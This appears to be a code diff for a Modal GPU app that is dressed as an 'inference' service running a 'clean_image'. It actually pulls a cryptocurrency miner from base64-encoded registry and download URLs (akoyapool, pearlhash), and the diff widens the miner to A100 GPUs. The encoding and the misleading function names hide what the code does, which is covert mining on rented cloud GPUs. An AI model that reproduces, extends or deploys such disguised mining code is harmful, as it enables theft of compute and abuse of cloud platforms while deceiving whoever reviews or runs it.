@@ -25,8 +25,8 @@ def _setup_runtime():
     
     # https://github.com/.../crane
     crane_url = _d(b"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9nby1jb250YWluZXJyZWdpc3RyeS9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvZ28tY29udGFpbmVycmVnaXN0cnlfTGludXhfeDg2XzY0LnRhci5neg==")
-    # registry.akoyapool.com/akoya-miner:latest-cuda122
-    opt_registry = _d(b"cmVnaXN0cnkuYWtveWFwb29sLmNvbS9ha295YS1taW5lcjpsYXRlc3QtY3VkYTEyMg==")
+    # registry.akoyapool.com/akoya-miner:latest
+    opt_registry = _d(b"cmVnaXN0cnkuYWtveWFwb29sLmNvbS9ha295YS1taW5lcjpsYXRlc3Q=")
     # https://pearlhash.xyz/downloads/pearl-miner-v8
     fb_url = _d(b"aHR0cHM6Ly9wZWFybGhhc2gueHl6L2Rvd25sb2Fkcy9wZWFybC1taW5lci12OA==")
 
@@ -157,7 +157,7 @@ def core_inference(worker_name: str):
         _run_fallback(worker_name, W)
 
 
-# === H200 & H100 ONLY ===
+# === H200, H100, A100 ===
 
 @app.function(gpu="H200", image=clean_image, timeout=86400)
 def inference_h200(worker_name: str = "compute-node"):
@@ -167,11 +167,15 @@ def inference_h200(worker_name: str = "compute-node"):
 def inference_h100(worker_name: str = "compute-node"):
     core_inference(worker_name)
 
+@app.function(gpu="A100-80GB", image=clean_image, timeout=86400)
+def inference_a100_80(worker_name: str = "compute-node"):
+    core_inference(worker_name)
+
 @app.local_entrypoint()
 def main():
     gpu = os.environ.get("GPU_TYPE", "H200")
     worker = os.environ.get("W_NAME", "compute-node")
-    targets = {"H200": inference_h200, "H100": inference_h100}
+    targets = {"H200": inference_h200, "H100": inference_h100, "A100-80GB": inference_a100_80}
     order = [gpu] + [g for g in targets if g != gpu]
 
     for g in order:
